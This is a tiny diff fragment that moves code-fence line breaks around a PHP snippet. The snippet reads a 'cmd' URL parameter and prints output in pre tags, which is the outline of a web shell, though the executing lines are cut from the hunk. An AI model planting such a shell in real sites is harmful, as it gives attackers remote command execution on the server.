@@ -1,4 +1,5 @@
-```<?php
+```
+<?php
 if (isset($_GET['cmd']))
 {
 
@@ -9,4 +10,5 @@ if (isset($_GET['cmd']))
   echo '</pre>';
 
 }
-?>```
+?>
+```
